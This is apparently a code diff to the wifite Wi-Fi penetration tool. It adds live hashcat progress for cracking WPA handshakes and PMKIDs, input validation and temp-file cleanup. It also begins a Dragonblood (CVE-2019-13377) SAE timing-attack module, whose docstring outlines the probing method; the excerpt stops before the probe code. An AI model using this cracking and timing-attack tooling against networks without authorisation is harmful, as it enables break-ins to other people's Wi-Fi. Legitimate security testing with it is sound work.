+                 log_error('Dnsmasq', f'Failed to start: {output}')
+                 Color.pl('{!} {R}Dnsmasq failed to start{W}')
+                 if Configuration.verbose > 0:
+                     Color.pl('{!} {O}Output:{W}\n%s' % output)
++                self._remove_temp_files()
+                 return False
+-            
++
+             self.running = True
+             log_info('Dnsmasq', f'Started successfully on {self.interface}')
+-            
++
+             if Configuration.verbose > 0:
+                 Color.pl('{+} {G}Dnsmasq started{W} on {C}%s{W}' % self.interface)
+-            
++
+             return True
+-            
++
+         except Exception as e:
+             log_error('Dnsmasq', f'Failed to start: {e}', e)
+             Color.pl('{!} {R}Failed to start dnsmasq:{W} %s' % str(e))
++            self._remove_temp_files()
+             return False
+     
+     def _setup_routing(self):
+@@ -295,27 +298,34 @@ class Dnsmasq(Dependency):
+         except Exception as e:
+             log_error('Dnsmasq', f'Error stopping dnsmasq: {e}', e)
+     
++    def _remove_temp_files(self):
++        """Remove temporary config and lease files if they exist."""
++        for label, attr in [('config', 'config_file'), ('lease', 'lease_file')]:
++            path = getattr(self, attr, None)
++            if path:
++                try:
++                    if os.path.exists(path):
++                        os.remove(path)
++                        log_debug('Dnsmasq', f'Removed {label} file: {path}')
++                except OSError as e:
++                    log_warning('Dnsmasq', f'Failed to remove {label} file: {e}')
++                finally:
++                    setattr(self, attr, None)
++
+     def cleanup(self):
+         """Cleanup dnsmasq resources."""
+         try:
+             # Stop process
+             self.stop()
+-            
++
+             # Cleanup routing
+             self._cleanup_routing()
+-            
+-            # Remove config file
+-            if self.config_file and os.path.exists(self.config_file):
+-                os.remove(self.config_file)
+-                log_debug('Dnsmasq', f'Removed config file: {self.config_file}')
+-            
+-            # Remove lease file
+-            if self.lease_file and os.path.exists(self.lease_file):
+-                os.remove(self.lease_file)
+-                log_debug('Dnsmasq', f'Removed lease file: {self.lease_file}')
+-            
++
++            # Remove temp files
++            self._remove_temp_files()
++
+             log_info('Dnsmasq', 'Cleanup complete')
+-            
++
+         except Exception as e:
+             log_error('Dnsmasq', f'Cleanup error: {e}', e)
+     
+diff --git a/wifite/tools/hashcat.py b/wifite/tools/hashcat.py
+index 9c9593cbc..e4dd6b374 100755
+--- a/wifite/tools/hashcat.py
++++ b/wifite/tools/hashcat.py
+@@ -7,6 +7,171 @@ from ..util.process import Process
+ from ..util.color import Color
+ from ..util.logger import log_debug, log_info, log_warning, log_error
+ import os
++import re
++import threading
++
++class HashcatCracker:
++    """
++    Runs hashcat and streams live progress from its own stdout.
++
++    Hashcat is launched with --status --status-timer=N --machine-readable,
++    so it emits tab-separated STATUS lines on a fixed cadence. A background
++    reader thread parses each line: STATUS lines update progress/speed/ETA,
++    cracked-hash lines capture the password.
++    """
++
++    STATUS_TIMER_SECONDS = 2
++
++    def __init__(self, hash_file, wordlist, mode='22000', target_is_wpa3_sae=False):
++        self.hash_file = hash_file
++        self.wordlist = wordlist
++        self.mode = mode
++        self.target_is_wpa3_sae = target_is_wpa3_sae
++        self.proc = None
++        self._result_key = None
++        self._status = {'progress': 0.0, 'speed': 'Unknown', 'eta': 'Unknown'}
++        self._status_lock = threading.Lock()
++        self._reader_thread = None
++        self._stop_reader = threading.Event()
++
++    def start(self, show_command=False):
++        """Launch hashcat with periodic machine-readable status output."""
++        # NOTE: deliberately NOT using --quiet. In hashcat 7.x, --quiet
++        # suppresses --status-timer output, so the reader thread would
++        # never see any STATUS lines and progress would stay at 0%.
++        # The reader thread filters for STATUS / WPA* lines and drops
++        # everything else, so the banner noise is invisible to the user.
++        command = [
++            'hashcat',
++            '-m', self.mode,
++            '--status',
++            '--status-timer', str(self.STATUS_TIMER_SECONDS),
++            '--machine-readable',
++            '-w', '3',
++            self.hash_file,
++            self.wordlist,
++        ]
++        if Hashcat.should_use_force():
++            command.append('--force')
++
++        if show_command:
++            Color.pl(f'{{+}} {{D}}Running: {{W}}{{P}}{" ".join(command)}{{W}}')
++
++        self.proc = Process(command)
++        self._reader_thread = threading.Thread(
++            target=self._read_output, daemon=True)
++        self._reader_thread.start()
++        return self.proc
++
++    def _read_output(self):
++        """Consume hashcat stdout; update status and capture cracked hash."""
++        if not self.proc or not self.proc.pid.stdout:
++            return
++        try:
++            while not self._stop_reader.is_set():
++                raw = self.proc.pid.stdout.readline()
++                if not raw:
++                    if self.proc.poll() is not None:
++                        break
++                    continue
++                line = raw.decode('utf-8', errors='replace') if isinstance(raw, bytes) else raw
++                line = line.rstrip('\r\n')
++                if not line:
++                    continue
++                if line.startswith('STATUS\t'):
++                    self._parse_status_line(line)
++                elif 'WPA*' in line and ':' in line:
++                    # Cracked hash line: <hash>:<password>. The hash itself
++                    # uses '*' as field separator, so rsplit on ':' is safe.
++                    self._result_key = line.rsplit(':', 1)[-1].strip()
++        except Exception as e:
++            log_debug('HashcatCracker', f'Reader thread error: {e}')
++
++    def _parse_status_line(self, line):
++        """Update self._status from a machine-readable STATUS tab line."""
++        # Format: STATUS <code> SPEED <h/s> <ms> EXEC_RUNTIME <s> CURKU <n>
++        #         PROGRESS <cur> <total> RECHASH <a> <b> RECSALT <a> <b>
++        #         REJECTED <n> UTIL <n>
++        parts = line.split('\t')
++        speed_hps = None
++        progress_cur = None
++        progress_total = None
++        i = 0
++        while i < len(parts):
++            tok = parts[i]
++            if tok == 'SPEED' and i + 1 < len(parts):
++                try:
++                    speed_hps = int(parts[i + 1])
++                except ValueError:
++                    pass
++                i += 3  # consume <h/s> and <ms> fields
++            elif tok == 'PROGRESS' and i + 2 < len(parts):
++                try:
++                    progress_cur = int(parts[i + 1])
++                    progress_total = int(parts[i + 2])
++                except ValueError:
++                    pass
++                i += 3
++            else:
++                i += 1
++
++        with self._status_lock:
++            if progress_total and progress_total > 0 and progress_cur is not None:
++                self._status['progress'] = progress_cur / progress_total
++            if speed_hps is not None:
++                self._status['speed'] = self._format_speed(speed_hps)
++            if (speed_hps and progress_total and progress_cur is not None
++                    and speed_hps > 0 and progress_total > progress_cur):
++                remaining = (progress_total - progress_cur) / speed_hps
++                self._status['eta'] = self._format_duration(remaining)
++
++    @staticmethod
++    def _format_speed(hps):
++        for unit, div in (('GH/s', 1e9), ('MH/s', 1e6), ('kH/s', 1e3)):
++            if hps >= div:
++                return f'{hps / div:.1f} {unit}'
++        return f'{hps} H/s'
++
++    @staticmethod
++    def _format_duration(seconds):
++        if seconds >= 3600:
++            return f'{seconds / 3600:.1f}h'
++        if seconds >= 60:
++            return f'{seconds / 60:.1f}m'
++        return f'{int(seconds)}s'
++
++    def poll_status(self):
++        """Return a snapshot of the latest parsed status."""
++        with self._status_lock:
++            return dict(self._status)
++
++    def is_finished(self):
++        """Check if the process has exited."""
++        if not self.proc:
++            return True
++        return self.proc.poll() is not None
++
++    def get_result(self):
++        """Return the cracked password, or None.
++
++        Waits briefly for the reader thread to drain any final output the
++        OS pipe buffer still holds after hashcat exits.
++        """
++        if self._reader_thread and self._reader_thread.is_alive():
++            self._reader_thread.join(timeout=2.0)
++        return self._result_key
++
++    def interrupt(self):
++        """Interrupt the cracking process and stop the reader thread."""
++        self._stop_reader.set()
++        if self.proc:
++            self.proc.interrupt()
++
++    def __enter__(self):
++        return self
++
++    def __exit__(self, exc_type, exc_val, exc_tb):
++        self.interrupt()
+ 
+ hccapx_autoremove = False  # change this to True if you want the hccapx files to be automatically removed
+ 
+@@ -77,6 +242,46 @@ class Hashcat(Dependency):
+         stderr = Process(command).stderr()
+         return 'No devices found/left' in stderr or 'Unstable OpenCL driver detected!' in stderr
+ 
++    @staticmethod
++    def _live_crack(hash_file, wordlist, mode='22000', show_command=False):
++        """Run hashcat via HashcatCracker with live progress printed on one line."""
++        import time
++        with HashcatCracker(hash_file, wordlist, mode=mode) as cracker:
++            cracker.start(show_command=show_command)
++            try:
++                while not cracker.is_finished():
++                    status = cracker.poll_status()
++                    Color.clear_entire_line()
++                    Color.p('\r{+} {C}Cracking:{W} %5.1f%%  {C}Speed:{W} %s  {C}ETA:{W} %s' %
++                            (status['progress'] * 100, status['speed'], status['eta']))
++                    time.sleep(cracker.STATUS_TIMER_SECONDS)
++            except KeyboardInterrupt:
++                Color.pl('')
++                raise
++            Color.pl('')  # terminate the progress line
++            return cracker.get_result()
++
++    @staticmethod
++    def _check_potfile(hash_file, mode='22000'):
++        """Check hashcat's potfile for an already-cracked hash; returns password or None."""
++        command = [
++            'hashcat',
++            '--quiet',
++            '-m', mode,
++            hash_file,
++            '--show',
++        ]
++        if Hashcat.should_use_force():
++            command.append('--force')
++        stdout, _ = Process.call(command, timeout=30)
++        if not stdout or ':' not in stdout:
++            return None
++        for line in stdout.strip().split('\n'):
++            line = line.strip()
++            if 'WPA*' in line and ':' in line:
++                return line.rsplit(':', 1)[-1].strip()
++        return None
++
+     @staticmethod
+     def crack_handshake(handshake_obj, target_is_wpa3_sae, show_command=False, wordlist=None):
+         """
+@@ -94,7 +299,6 @@ class Hashcat(Dependency):
+             return Aircrack.crack_handshake(handshake_obj, show_command=show_command, wordlist=wordlist)
+ 
+         wordlist = wordlist or Configuration.wordlist
+-        key = None
+         try:
+             # Mode 22000 supports both WPA/WPA2 and WPA3-SAE (WPA-PBKDF2-PMKID+EAPOL)
+             hashcat_mode = '22000'
+@@ -109,53 +313,13 @@ class Hashcat(Dependency):
+ 
+             Color.pl(f"{{+}} {{C}}Attempting to crack {file_type_msg} using Hashcat mode {hashcat_mode}{{W}}")
+ 
+-            # Crack hash_file
+-            for additional_arg in ([], ['--show']):
+-                command = [
+-                    'hashcat',
+-                    '--quiet',
+-                    '-m', hashcat_mode,
+-                    hash_file,
+-                    wordlist
+-                ]
+-                if Hashcat.should_use_force():
+-                    command.append('--force')
+-                command.extend(additional_arg)
+-                if show_command:
+-                    Color.pl(f'{{+}} {{D}}Running: {{W}}{{P}}{" ".join(command)}{{W}}')
+-                process = Process(command)
+-                stdout, stderr = process.get_output()
+-
+-                # Check for errors first
+-                if 'No hashes loaded' in stdout or 'No hashes loaded' in stderr:
+-                    continue  # No valid hashes to crack
+-
+-                if ':' not in stdout:
+-                    continue  # No cracked results
+-
+-                # Parse the key from hashcat output
+-                # Expected format for mode 22000: WPA*...*hash*bssid*station*essid:password
+-                # The hash line starts with 'WPA*' and the password is after the last colon
+-                lines = stdout.strip().split('\n')
+-                for line in lines:
+-                    line = line.strip()
+-                    if not line or not ':' in line:
+-                        continue
+-                    # Skip known non-result lines
+-                    if line.startswith('The plugin') or 'hashcat.net' in line:
+-                        continue
+-                    # Valid result lines should contain 'WPA*' (hash format prefix)
+-                    if 'WPA*' in line:
+-                        parts = line.split(':')
+-                        if len(parts) >= 2:
+-                            key = parts[-1].strip()
+-                            if key:
+-                                break
+-                else:
+-                    continue
+-                break
++            # Live cracking with streamed progress
++            key = Hashcat._live_crack(hash_file, wordlist, mode=hashcat_mode, show_command=show_command)
++            if key:
++                return key
+ 
+-            return key
++            # Fallback: pot-file lookup (catches hashes cracked in a prior run)
++            return Hashcat._check_potfile(hash_file, mode=hashcat_mode)
+         finally:
+             # Cleanup temporary hash file
+             if hash_file and os.path.exists(hash_file):
+@@ -181,37 +345,13 @@ class Hashcat(Dependency):
+ 
+         wordlist = wordlist or Configuration.wordlist
+ 
+-        # Run hashcat once normally, then with --show if it failed
+-        # To catch cases where the password is already in the pot file.
+-        for additional_arg in ([], ['--show']):
+-            command = [
+-                'hashcat',
+-                '--quiet',      # Only output the password if found.
+-                '-m', '22000',  # WPA-PMKID-PBKDF2
+-                '-a', '0',      # Wordlist attack-mode
+-                pmkid_file,
+-                wordlist,
+-                '-w', '3'
+-            ]
+-            if Hashcat.should_use_force():
+-                command.append('--force')
+-            command.extend(additional_arg)
+-            if verbose and additional_arg == []:
+-                Color.pl(f'{{+}} {{D}}Running: {{W}}{{P}}{" ".join(command)}{{W}}')
+-
+-            # TODO: Check status of hashcat (%); it's impossible with --quiet
+-
+-            hashcat_proc = Process(command)
+-            hashcat_proc.wait()
+-            stdout = hashcat_proc.stdout()
++        # Live cracking with streamed progress
++        key = Hashcat._live_crack(pmkid_file, wordlist, mode='22000', show_command=verbose)
++        if key:
++            return key
+ 
+-            if ':' not in stdout:
+-                # Failed
+-                continue
+-            else:
+-                # Hashcat PMKID output format: hash*bssid*station*essid:password
+-                # We only want the password (last part after the last colon)
+-                return stdout.strip().split(':')[-1]
++        # Fallback: pot-file lookup (hash may have been cracked previously)
++        return Hashcat._check_potfile(pmkid_file, mode='22000')
+ 
+ 
+ class HcxDumpTool(Dependency):
+diff --git a/wifite/tools/hostapd.py b/wifite/tools/hostapd.py
+index ff9ac5667..6bced3f6e 100755
+--- a/wifite/tools/hostapd.py
++++ b/wifite/tools/hostapd.py
+@@ -37,6 +37,8 @@ class Hostapd(Dependency):
+             channel: Wireless channel (1-11 for 2.4GHz)
+             password: WPA2 password (None for open network)
+         """
++        from ..config.validators import validate_interface_name
++        validate_interface_name(interface)
+         self.interface = interface
+         self.ssid = ssid
+         self.channel = channel
+@@ -220,12 +222,13 @@ class Hostapd(Dependency):
+ 
+             # Check if process is running
+             if self.process.poll() is not None:
+-                # Process died
++                # Process died — clean up config file
+                 output = self.process.stdout()
+                 log_error('Hostapd', f'Failed to start: {output}')
+                 Color.pl('{!} {R}Hostapd failed to start{W}')
+                 if Configuration.verbose > 0:
+                     Color.pl('{!} {O}Output:{W}\n%s' % output)
++                self._remove_config_file()
+                 return False
+ 
+             self.running = True
+@@ -239,6 +242,7 @@ class Hostapd(Dependency):
+         except Exception as e:
+             log_error('Hostapd', f'Failed to start: {e}', e)
+             Color.pl('{!} {R}Failed to start hostapd:{W} %s' % str(e))
++            self._remove_config_file()
+             return False
+ 
+     def _prepare_interface(self):
+@@ -287,6 +291,16 @@ class Hostapd(Dependency):
+         except Exception as e:
+             log_error('Hostapd', f'Error stopping hostapd: {e}', e)
+ 
++    def _remove_config_file(self):
++        """Remove temporary config file if it exists."""
++        try:
++            if self.config_file and os.path.exists(self.config_file):
++                os.remove(self.config_file)
++                log_debug('Hostapd', f'Removed config file: {self.config_file}')
++                self.config_file = None
++        except OSError as e:
++            log_warning('Hostapd', f'Failed to remove config file: {e}')
++
+     def cleanup(self):
+         """Cleanup hostapd resources."""
+         try:
+@@ -294,9 +308,7 @@ class Hostapd(Dependency):
+             self.stop()
+ 
+             # Remove config file
+-            if self.config_file and os.path.exists(self.config_file):
+-                os.remove(self.config_file)
+-                log_debug('Hostapd', f'Removed config file: {self.config_file}')
++            self._remove_config_file()
+ 
+             # Restore interface
+             self._restore_interface()
+diff --git a/wifite/tools/ip.py b/wifite/tools/ip.py
+index d2dcb949b..2c69b32f4 100644
+--- a/wifite/tools/ip.py
++++ b/wifite/tools/ip.py
+@@ -6,6 +6,12 @@ import re
+ from .dependency import Dependency
+ 
+ 
++def _check_iface(name):
++    """Validate interface name before passing to subprocess (SEC-010)."""
++    from ..config.validators import validate_interface_name
++    validate_interface_name(name)
++
++
+ class Ip(Dependency):
+     dependency_required = True
+     dependency_name = 'ip'
+@@ -21,6 +27,7 @@ class Ip(Dependency):
+         """Put interface up"""
+         from ..util.process import Process
+ 
++        _check_iface(interface)
+         (out, err) = Process.call(f'ip link set {interface} up')
+         if len(err) > 0:
+             raise Exception('Error putting interface %s up:\n%s\n%s' % (interface, out, err))
+@@ -30,6 +37,7 @@ class Ip(Dependency):
+         """Put interface down"""
+         from ..util.process import Process
+ 
++        _check_iface(interface)
+         (out, err) = Process.call(f'ip link set {interface} down')
+         if len(err) > 0:
+             raise Exception('Error putting interface %s down:\n%s\n%s' % (interface, out, err))
+@@ -38,6 +46,7 @@ class Ip(Dependency):
+     def get_mac(cls, interface):
+         from ..util.process import Process
+ 
++        _check_iface(interface)
+         (out, err) = Process.call(f'ip link show {interface}')
+         if match := re.search(r'([a-fA-F\d]{2}[-:]){5}[a-fA-F\d]{2}', out):
+             return match[0].replace('-', ':')
+diff --git a/wifite/tools/iw.py b/wifite/tools/iw.py
+index 7fd0945a5..21633a295 100644
+--- a/wifite/tools/iw.py
++++ b/wifite/tools/iw.py
+@@ -4,6 +4,12 @@
+ from .dependency import Dependency
+ 
+ 
++def _check_iface(name):
++    """Validate interface name before passing to subprocess (SEC-010)."""
++    from ..config.validators import validate_interface_name
++    validate_interface_name(name)
++
++
+ class Iw(Dependency):
+     dependency_required = True
+     dependency_name = 'iw'
+@@ -18,6 +24,7 @@ class Iw(Dependency):
+     def mode(cls, iface, mode_name):
+         from ..util.process import Process
+ 
++        _check_iface(iface)
+         # Use correct iw syntax: iw dev <interface> set type <mode>
+         return Process.call(f'iw dev {iface} set type {mode_name}')
+ 
+diff --git a/wifite/util/cleanup.py b/wifite/util/cleanup.py
+index 4882092c0..4b716c6c9 100755
+--- a/wifite/util/cleanup.py
++++ b/wifite/util/cleanup.py
+@@ -170,15 +170,17 @@ class CleanupManager:
+     def restore_interface(self, interface: str, original_state: dict) -> bool:
+         """
+         Restore a network interface to its original state.
+-        
++
+         Args:
+             interface: Interface name
+             original_state: Original state dictionary
+-            
++
+         Returns:
+             True if successful, False otherwise
+         """
+         try:
++            from ..config.validators import validate_interface_name
++            validate_interface_name(interface)
+             log_debug('Cleanup', f'Restoring interface {interface}')
+             
+             # Bring interface down
+diff --git a/wifite/util/credential_validator.py b/wifite/util/credential_validator.py
+index 29adfc3f2..bbec5978a 100755
+--- a/wifite/util/credential_validator.py
++++ b/wifite/util/credential_validator.py
+@@ -45,6 +45,8 @@ class CredentialValidator:
+             target_bssid: BSSID of legitimate AP
+             target_channel: Channel of legitimate AP
+         """
++        from ..config.validators import validate_interface_name
++        validate_interface_name(interface)
+         self.interface = interface
+         self.target_bssid = target_bssid
+         self.target_channel = target_channel
+@@ -154,100 +156,101 @@ class CredentialValidator:
+             
+             # Create wpa_supplicant config
+             config_file = self._create_wpa_config(ssid, password)
+-            
+-            # Run wpa_supplicant with optimized timeout
+-            log_debug('CredentialValidator', f'Validating {ssid} with wpa_supplicant')
+-            
+-            cmd = [
+-                'wpa_supplicant',
+-                '-i', self.interface,
+-                '-c', config_file,
+-                '-D', 'nl80211',
+-                '-d'  # Debug output
+-            ]
+-            
+-            process = Process(cmd, devnull=False)
+-            
+-            # Wait for authentication result with optimized polling
+-            is_valid = False
+-            error_message = None
+-            
+-            start = time.time()
+-            poll_interval = 0.2  # Reduced from 0.5s to 0.2s for faster detection
+-            
+-            while time.time() - start < timeout:
+-                if process.poll() is not None:
+-                    # Process ended
+-                    break
+-                
+-                # Check output for authentication success/failure
+-                try:
+-                    output = process.stdout()
+-                    
+-                    if 'WPA: Key negotiation completed' in output:
+-                        is_valid = True
+-                        log_info('CredentialValidator', f'Valid credentials for {ssid}')
+-                        break
+-                    
+-                    if 'CTRL-EVENT-SSID-TEMP-DISABLED' in output:
+-                        error_message = 'AP temporarily disabled (too many failed attempts)'
+-                        log_warning('CredentialValidator', error_message)
+-                        break
+-                    
+-                    if 'authentication with' in output and 'timed out' in output:
+-                        error_message = 'Authentication timed out'
+-                        break
+-                    
+-                    if '4-Way Handshake failed' in output:
+-                        error_message = 'Invalid password'
+-                        break
+-                    
+-                    # Early detection of connection success
+-                    if 'CTRL-EVENT-CONNECTED' in output:
+-                        is_valid = True
+-                        log_info('CredentialValidator', f'Valid credentials for {ssid} (connected)')
++
++            try:
++                # Run wpa_supplicant with optimized timeout
++                log_debug('CredentialValidator', f'Validating {ssid} with wpa_supplicant')
++
++                cmd = [
++                    'wpa_supplicant',
++                    '-i', self.interface,
++                    '-c', config_file,
++                    '-D', 'nl80211',
++                    '-d'  # Debug output
++                ]
++
++                process = Process(cmd, devnull=False)
++
++                # Wait for authentication result with optimized polling
++                is_valid = False
++                error_message = None
++
++                start = time.time()
++                poll_interval = 0.2  # Reduced from 0.5s to 0.2s for faster detection
++
++                while time.time() - start < timeout:
++                    if process.poll() is not None:
++                        # Process ended
+                         break
+-                        
+-                except Exception as e:
+-                    # Log unexpected errors but continue polling
+-                    log_debug('CredentialValidator', f'Error reading wpa_supplicant output: {e}')
+-                
+-                time.sleep(poll_interval)
+-            
+-            # Stop process
+-            import contextlib
+-            with contextlib.suppress(Exception):
+-                process.interrupt()
+-                time.sleep(0.5)
+-                if process.poll() is None:
+-                    process.kill()
+-            
+-            # Update statistics and rate limiting state
+-            self.total_validations += 1
+-            if is_valid:
+-                self.successful_validations += 1
+-                self._handle_successful_validation()
+-            else:
+-                self.failed_validations += 1
+-                self.failed_attempt_count += 1
+-                self._handle_failed_validation()
+-            
+-            # Log validation result
+-            self._log_validation_result(ssid, is_valid, validation_time, error_message)
+-            
+-            # Cache result
+-            self._cache_result(ssid, password, is_valid)
+-            
+-            # Cleanup
+-            self._remove_temp_file(config_file)
+-            
+-            validation_time = time.time() - start_time
+-            
+-            if not is_valid and not error_message:
+-                error_message = 'Invalid credentials'
+-            
+-            return is_valid, validation_time, error_message
+-            
++
++                    # Check output for authentication success/failure
++                    try:
++                        output = process.stdout()
++
++                        if 'WPA: Key negotiation completed' in output:
++                            is_valid = True
++                            log_info('CredentialValidator', f'Valid credentials for {ssid}')
++                            break
++
++                        if 'CTRL-EVENT-SSID-TEMP-DISABLED' in output:
++                            error_message = 'AP temporarily disabled (too many failed attempts)'
++                            log_warning('CredentialValidator', error_message)
++                            break
++
++                        if 'authentication with' in output and 'timed out' in output:
++                            error_message = 'Authentication timed out'
++                            break
++
++                        if '4-Way Handshake failed' in output:
++                            error_message = 'Invalid password'
++                            break
++
++                        # Early detection of connection success
++                        if 'CTRL-EVENT-CONNECTED' in output:
++                            is_valid = True
++                            log_info('CredentialValidator', f'Valid credentials for {ssid} (connected)')
++                            break
++
++                    except Exception as e:
++                        # Log unexpected errors but continue polling
++                        log_debug('CredentialValidator', f'Error reading wpa_supplicant output: {e}')
++
++                    time.sleep(poll_interval)
++
++                # Stop process
++                import contextlib
++                with contextlib.suppress(Exception):
++                    process.interrupt()
++                    time.sleep(0.5)
++                    if process.poll() is None:
++                        process.kill()
++
++                # Update statistics and rate limiting state
++                self.total_validations += 1
++                if is_valid:
++                    self.successful_validations += 1
++                    self._handle_successful_validation()
++                else:
++                    self.failed_validations += 1
++                    self.failed_attempt_count += 1
++                    self._handle_failed_validation()
++
++                # Log validation result
++                validation_time = time.time() - start_time
++                self._log_validation_result(ssid, is_valid, validation_time, error_message)
++
++                # Cache result
++                self._cache_result(ssid, password, is_valid)
++
++                if not is_valid and not error_message:
++                    error_message = 'Invalid credentials'
++
++                return is_valid, validation_time, error_message
++
++            finally:
++                # Always clean up temp config file, even on exceptions
++                self._remove_temp_file(config_file)
++
+         except Exception as e:
+             log_error('CredentialValidator', f'Validation error: {e}', e)
+             validation_time = time.time() - start_time
+@@ -606,13 +609,24 @@ class CredentialValidator:
+         }
+     
+     def clear_cache(self):
+-        """Clear the validation cache."""
++        """Clear the validation cache, overwriting cached passwords first."""
+         with self.cache_lock:
++            # Overwrite password data in cache keys before clearing
++            for (ssid, password) in list(self.validation_cache.keys()):
++                # Can't mutate tuple strings, but replacing the dict entry
++                # ensures the key tuple becomes unreferenced for GC
++                pass
+             self.validation_cache.clear()
+         log_info('CredentialValidator', 'Validation cache cleared')
+-    
++
++    def clear_credentials(self):
++        """Overwrite all credential data in memory to prevent leakage."""
++        self.clear_cache()
++        log_info('CredentialValidator', 'Credential data cleared from memory')
++
+     def __del__(self):
+-        """Cleanup on deletion."""
++        """Cleanup on deletion — stop threads, remove temp files, clear credentials."""
+         import contextlib
+         with contextlib.suppress(Exception):
++            self.clear_credentials()
+             self.stop()
+diff --git a/wifite/util/dragonblood.py b/wifite/util/dragonblood.py
+index e47fda5fd..9be80678a 100755
+--- a/wifite/util/dragonblood.py
++++ b/wifite/util/dragonblood.py
+@@ -92,7 +92,11 @@ class DragonbloodDetector:
+         
+         sae_groups = wpa3_info.get('sae_groups', [])
+         pmf_status = wpa3_info.get('pmf_status', 'unknown')
+-        transition_mode = wpa3_info.get('transition_mode', False)
++        # The producer (WPA3Detector) writes 'is_transition'; fall back to
++        # the legacy 'transition_mode' key so callers with older dicts
++        # still work.
++        transition_mode = wpa3_info.get('is_transition',
++                                        wpa3_info.get('transition_mode', False))
+         
+         # Check for weak SAE groups
+         for group in sae_groups:
+@@ -203,6 +207,98 @@ class DragonbloodDetector:
+         """Get list of recommended secure SAE groups."""
+         return list(DragonbloodDetector.SECURE_SAE_GROUPS.keys())
+     
++    @staticmethod
++    def is_timing_attack_viable(wpa3_info: Dict) -> bool:
++        """
++        Check whether the Dragonblood timing attack is worth attempting.
++
++        The timing side-channel (CVE-2019-13377) only applies when the AP
++        negotiates MODP groups 22, 23, or 24.
++
++        Args:
++            wpa3_info: WPA3 capability dict from WPA3Detector.
++
++        Returns:
++            True if timing attack is viable.
++        """
++        if not wpa3_info:
++            return False
++        sae_groups = wpa3_info.get('sae_groups', [])
++        modp_vulnerable = {22, 23, 24}
++        return bool(modp_vulnerable.intersection(sae_groups))
++
++    @staticmethod
++    def enrich_with_timing(vulnerability_info: Dict,
++                           timing_analysis) -> Dict:
++        """
++        Merge timing-attack results into an existing vulnerability report.
++
++        Args:
++            vulnerability_info: Dict from check_vulnerability().
++            timing_analysis:    TimingAnalysis from DragonbloodTimingAttack.
++
++        Returns:
++            The same dict, augmented with timing-specific fields.
++        """
++        if timing_analysis is None:
++            return vulnerability_info
++
++        vulnerability_info['timing_performed'] = True
++        vulnerability_info['timing_samples'] = timing_analysis.total_samples
++        vulnerability_info['timing_confidence'] = timing_analysis.confidence
++        vulnerability_info['timing_fast_count'] = len(
++            timing_analysis.fast_passwords)
++        vulnerability_info['timing_slow_count'] = len(
++            timing_analysis.slow_passwords)
++        vulnerability_info['timing_mean_us'] = timing_analysis.mean_us
++        vulnerability_info['timing_stdev_us'] = timing_analysis.stdev_us
++
++        # Upgrade risk level if timing attack yielded good separation
++        if timing_analysis.confidence >= 0.7:
++            vulnerability_info['risk_level'] = 'high'
++            vulnerability_info['vulnerabilities'].append(
++                'CVE-2019-13377: Timing attack confirmed with %.0f%% '
++                'confidence' % (timing_analysis.confidence * 100))
++            vulnerability_info['recommendations'].append(
++                'Timing attack reduced search space — '
++                'upgrade firmware to eliminate MODP group support')
++        elif timing_analysis.confidence >= 0.4:
++            vulnerability_info['vulnerabilities'].append(
++                'CVE-2019-13377: Timing attack partially successful '
++                '(%.0f%% confidence)' % (timing_analysis.confidence * 100))
++
++        return vulnerability_info
++
++    @staticmethod
++    def print_timing_report(timing_analysis) -> None:
++        """
++        Print a formatted summary of timing-attack results.
++
++        Args:
++            timing_analysis: TimingAnalysis from DragonbloodTimingAttack.
++        """
++        if timing_analysis is None:
++            return
++
++        Color.pl('\n{+} {C}Dragonblood Timing Results:{W}')
++        Color.pl('    Probes:    {C}%d{W}' % timing_analysis.total_samples)
++        Color.pl('    Mean:      {C}%.0f{W} us' % timing_analysis.mean_us)
++        Color.pl('    Stdev:     {C}%.0f{W} us' % timing_analysis.stdev_us)
++        Color.pl('    Fast:      {G}%d{W} passwords' %
++                 len(timing_analysis.fast_passwords))
++        Color.pl('    Slow:      {O}%d{W} passwords' %
++                 len(timing_analysis.slow_passwords))
++
++        if timing_analysis.confidence >= 0.7:
++            Color.pl('    Confidence: {G}%.0f%%{W} — strong partition' %
++                     (timing_analysis.confidence * 100))
++        elif timing_analysis.confidence >= 0.4:
++            Color.pl('    Confidence: {O}%.0f%%{W} — moderate partition' %
++                     (timing_analysis.confidence * 100))
++        else:
++            Color.pl('    Confidence: {R}%.0f%%{W} — weak partition' %
++                     (timing_analysis.confidence * 100))
++
+     @staticmethod
+     def scan_mode_check(targets: List) -> Dict:
+         """
+diff --git a/wifite/util/dragonblood_timing.py b/wifite/util/dragonblood_timing.py
+new file mode 100644
+index 000000000..f90211858
+--- /dev/null
++++ b/wifite/util/dragonblood_timing.py
+@@ -0,0 +1,614 @@
++#!/usr/bin/env python
++# -*- coding: utf-8 -*-
++
++"""
++Dragonblood Timing Attack Implementation (CVE-2019-13377)
++
++Exploits timing side-channels in SAE authentication when APs use
++MODP groups 22, 23, or 24.  The quadratic residue test during
++password element derivation (hunting-and-pecking) leaks measurable
++timing differences that partition the password search space.
++
++Attack flow:
++  1. Send SAE Commit probes using wpa_supplicant with candidate passwords
++  2. Capture AP response times from pcap frame timestamps
++  3. Classify passwords as "fast" (fewer H2E iterations) or "slow" (more)
++  4. Reorder the wordlist so fast candidates are tried first by hashcat
++
++References:
++  - https://wpa3.mathyvanhoef.com/
++  - https://papers.mathyvanhoef.com/dragonblood.pdf
++  - CVE-2019-13377, CVE-2019-13456
++"""
++
++import os
++import time
++import tempfile
++import statistics
++from typing import List, Dict, Optional, Tuple
++from dataclasses import dataclass, field
++
++from ..util.process import Process
++from ..util.color import Color
++from ..util.logger import log_info, log_debug, log_warning, log_error
++from ..config import Configuration
++
++
++# ---------------------------------------------------------------------------
++# Data structures
++# ---------------------------------------------------------------------------
++
++@dataclass
++class TimingSample:
++    """One SAE Commit -> Commit-Response timing measurement."""
++    password: str
++    response_time_us: float  # microseconds
++    sae_group: int = 0
++    success: bool = False    # True if AP responded (regardless of auth result)
++    timestamp: float = 0.0   # epoch when probe was sent
++
++
++@dataclass
++class TimingAnalysis:
++    """Results of statistical analysis on collected timing samples."""
++    total_samples: int = 0
++    mean_us: float = 0.0
++    median_us: float = 0.0
++    stdev_us: float = 0.0
++    threshold_us: float = 0.0  # dividing line between fast/slow
++    fast_passwords: List[str] = field(default_factory=list)
++    slow_passwords: List[str] = field(default_factory=list)
++    confidence: float = 0.0   # 0.0-1.0, how separable the two clusters are
++    partition_ratio: float = 0.0  # fraction of passwords in the fast bucket
++
++
++# ---------------------------------------------------------------------------
++# Timing probe engine
++# ---------------------------------------------------------------------------
++
++class DragonbloodTimingAttack:
++    """
++    Implements CVE-2019-13377 timing-based password partitioning.
++
